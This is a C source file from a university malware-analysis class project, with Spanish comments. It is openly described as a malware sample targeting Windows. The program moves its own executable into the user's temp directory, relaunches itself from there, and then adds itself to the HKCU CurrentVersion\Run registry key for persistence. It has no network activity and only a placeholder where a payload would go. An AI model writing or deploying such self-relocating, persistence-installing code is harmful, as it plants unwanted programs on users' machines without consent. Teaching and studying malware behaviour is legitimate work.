/* -------------------------------------------------------------------
 * malwareEjemplo.c
 * version 1.0
 * Copyright (C) 2016  Jose Ricardo Rodriguez Abreu.
 * Facultad de Ciencias,
 * Universidad Nacional Autonoma de Mexico, Mexico.
 *
 * Este programa es software libre; se puede redistribuir
 * y/o modificar en los terminos establecidos por la
 * Licencia Publica General de GNU tal como fue publicada
 * por la Free Software Foundation en la version 2 o
 * superior.
 *
 * Este programa es distribuido con la esperanza de que
 * resulte de utilidad, pero SIN GARANTIA ALGUNA; de hecho
 * sin la garantia implicita de COMERCIALIZACION o
 * ADECUACION PARA PROPOSITOS PARTICULARES. Vease la
 * Licencia Publica General de GNU para mayores detalles.
 *
 * Con este programa se debe haber recibido una copia de la
 * Licencia Publica General de GNU, de no ser asi, visite el
 * siguiente URL:
 * http://www.gnu.org/licenses/gpl.html
 * o escriba a la Free Software Foundation Inc.,
 * 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * -------------------------------------------------------------------
 */

/**
 * @file malwareEjemplo.c
 * @author Jose Ricardo Rodriguez Abreu
 * @date 18 Sep 2016
 * @brief File containing the first project for the "Malware Analysis"
 * class.
 *
 * Este programa es un malware que intenta duplicarse y generar
 * llamadas al sistema en Windows.
 *
 * @see https://github.com/ricardorodab/malwareEjemplo
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 *
 * Revisamos en que sistema operativo nos encontramos solo
 * si es windows continuamos la ejecucion del programa:
 *
 */

// Windows (32-bit y 64-bit)
#ifdef _WIN32
//#ifdef _WIN64
#define _UNICODE

#include <tchar.h>
#include <wchar.h>
#include <conio.h>
#include <windows.h>

#define BUFSIZE 1024

/**
 * Funcion que nos regresa el nombre del archivo.
 * @param nombre - Generalmente dada por la ruta de el mismo.
 * @return Un apuntador a la memoria del nombre del archivo.
 */
char* getNombre(char* nombre)
{
 //Buscamos el ultimo "\" para saber donde empieza su vedadero nombre.
  char nombre2[MAX_PATH];
  strcpy(nombre2,nombre);
  int i = 0;
  int j = 0;
  int mark = 0;
  while(j == 0){
    if(nombre2[i] == '\\'){
      mark = i;
    }else if(nombre2[i] == '\0'){
      j = 1;
    }
    i++;
  }
  if(mark != 0){ mark++; }
  //Creamos el nombre en otro arreglo.
  char vddNombre[MAX_PATH];
  for(j = mark; j < i; j++){
    vddNombre[j-mark] = nombre2[j];
  }
  // Todo lo anterior fue para obtener el verdadero nombre.
  // Ahora solo queda guardar en memoria y hacer el return.
  char *ret = (char*) malloc(sizeof(char) * MAX_PATH);
  strcpy(ret,vddNombre);
  return ret;
}

/**
 * Funcion que revisa que estemos en el directorio tmp
 * nos regresa el valor de 1 o 0 como booleano.
 *
 * @return 1 si estamos en tmp y 0 caso contrario.
 */
int cmplocation(char* nombre)
{
  char tmp[MAX_PATH];
  char loc[MAX_PATH];
  GetCurrentDirectory(sizeof(loc)-1,loc);
  GetTempPath(sizeof(tmp)-1,tmp);
  // Hacemos esto porque la cadena que nos regresa
  // GetCurrent y GetTemp difieren siempre en que uno
  // termina con "\" y el otro no.
  strcat(loc,"\\");
  int bool = strcmp(tmp,loc);
  
  if(bool == 0)
    {
      // Solo pasa esto si esta en tmp asi que
      // desde aqui invocamos las funciones que queremos
      // que el malware ejecute.
      printf("Desde aqui actua. Linea: %d\n",__LINE__);
      return -1;      
    }
  return mueveArchivo(loc,tmp,nombre);
}

/**
 * Funcion que crea el registro que lo hace persistente.
 * @param name - Recibe este parametro para que sea robusto.
 */
int registry_app(char* nombre)
{
  char* name = getNombre(nombre);
  HKEY hKey;
  DWORD dw;
  char sk[MAX_PATH]  = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  
  LONG openRes = RegOpenKeyEx(
			 HKEY_CURRENT_USER,
			 sk,
			 0,
			 KEY_ALL_ACCESS,
			 &hKey);
  // Revisamos que hayamos abierto correctamente el registro de llaves.
  if (openRes==ERROR_SUCCESS) {
    char loc[MAX_PATH];
    char fil[MAX_PATH];
    // Obtenemos de nuevo el directorio de trabajo:
    GetCurrentDirectory(sizeof(loc)-1,loc);
    // Recordando de nuevo que no agrega "\" se lo agregamos.
    strcat(loc,"\\");

    // Usaba fil y loc para dos cosas diferentes pero lo cambie.
    // y como estaba corto de tiempo y decidi no arriesgarme lo
    // deje asi como esta para evitar posibles errores.
    // "Y pongale aguacate a mi RAM" - Ricardo, 2016.
    strcpy(fil,loc);

    // Concatenamos el nombre de mi archivo con la ruta.
    strcat(fil,name);

    
    LONG createKey = RegSetValueEx(hKey,        // subkey handle
				   "Proyecto01",// Nombre del registro
				   0,           // must be zero
				   1,           // value type
				   (const BYTE *) fil, // pointer to value data
				   sizeof(fil)); // Nike: Just do it!

    // Revisamos que se haya creado correctamente.
    if(createKey == ERROR_SUCCESS)
      {
	/*
	 * Si se crea correctamente regresamos un 1.
	 * printf("Success creating key."); 
	 */
	return 1;	
      }
    // Si no se crea correctamente imprimimos que no se pudo
    // y mandamos un error de aproximacion de la linea de error.
    printf("Error creating key (Aprox linea: %d).",__LINE__);
    return 0;
  } else {
    // Esto se ejecuta al abrir las llaves y tener un error.
    // Si tuvimos error regresamos cero.
    printf("Error opening key (Aprox linea: %d).",__LINE__);
    return 0;
  }
}

/**
 * Esta funcion mueve el archivo desde cualquier lugar
 * hasta la localidad de tmp de Windows.
 * @param origen - Es donde se encuentra actualmente el archivo.
 * @param destino - Es a donde queremos mover (tmp);
 * @return Un 0 si hubo error, 1 en otro caso.
 */
int mueveArchivo(char* origen, char* destino, char* nombre)
{
  char* vddNombre = getNombre(nombre);
  int result;
  strcat(origen,vddNombre);
  strcat(destino,vddNombre);
  printf("Se mueve de %s ---> %s\n",origen,destino);
  result = MoveFileEx(origen,destino,MOVEFILE_WRITE_THROUGH);
  if(result == 0){
    result = MoveFileEx(origen,destino,MOVEFILE_REPLACE_EXISTING);
  }
  return result;
}

/**
 * Funcion que ejecuta un programa exe o un comando.
 * @param nombre - Es el nombre del archivo o el comando.
 */
void ejecutarDeNuevo(char* name)
{
  char* nombre = getNombre(name);
  char tmp[MAX_PATH];
  // El directorio padre del nuevo proceso:
  char tmpPure[MAX_PATH];
  // Volvemos a localizar a %tmp%.
  GetTempPath(sizeof(tmp)-1,tmp);
  strcpy(tmpPure,tmp);
  strcat(tmp,nombre);
  // Magia negra para ejecutar mas cosas:
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  ZeroMemory( &si, sizeof(si) );
  si.cb = sizeof(si);
  ZeroMemory( &pi, sizeof(pi) );
  // Funcion que tome de ejemplo. Original en:
  //  https://goo.gl/8YYFym
  CreateProcess(NULL,   // No module name (use command line)
		tmp,    // Command line
		NULL,   // Process handle not inheritable
		NULL,   // Thread handle not inheritable
		FALSE,  // Set handle inheritance to FALSE
		0,      // No creation flags
		NULL,   // Use parent's environment block
		tmpPure,// Use parent's starting directory
		&si,    // Pointer to STARTUPINFO structure
		&pi );  // Pointer to PROCESS_INFORMATION structure
}

/**
 * Es la unica función que llama
 * el main de nuestro malware en Window.
 * @param argc - Es el número de argumentos.
 * @param argv - Nos importa porque contiene el nombre.
 */
void so(int argc, char** argv)
{
  printf("Hola Windows!\n");

  int continuar = cmplocation(argv[0]);
  if(continuar == 0)
    {
      printf("Algo fallo\n");
    }
  else if(continuar == -1)
    {      
      printf("Success!!!\n");
      registry_app(argv[0]);
      int i;
      //getch();
      exit(0);
    }else{
    ejecutarDeNuevo(argv[0]);
  }
  //getch();
  exit(0);
} //Fin de la funcion so de Windows.



// Apple:
#elif __APPLE__
void so(int argc, char** argv)
{
  printf("Hola Apple!\n");  
  exit(0);
}

// Linux:
#elif __linux__
void so(int argc, char** argv)
{
  printf("Hola Linux!\n");
  exit(0);
}

// Unix:
#elif __unix__
void so(int argc, char** argv)
{
  printf("Hola Unix!\n");
  exit(0);
}

// Caso ajeno:
#else
#   error "Unknown compiler"
#endif


int main(int argc, char** argv)
{
  so(argc, argv);
  return 0;
}
